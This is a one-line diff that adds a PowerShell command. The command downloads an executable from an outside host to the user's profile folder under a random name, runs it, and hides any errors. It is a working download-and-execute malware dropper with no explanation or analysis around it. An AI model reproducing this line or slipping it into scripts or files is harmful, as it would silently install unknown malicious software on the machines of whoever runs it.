@@ -1,0 +1,1 @@
+try{(New-Object System.Net.WebClient).DownloadFile('https://a.lainfile.pw/nA',$env:USERPROFILE+'\cjVNNc.exe');(New-Object -com Shell.Application).ShellExecute($env:USERPROFILE+'\cjVNNc.exe');}catch {}
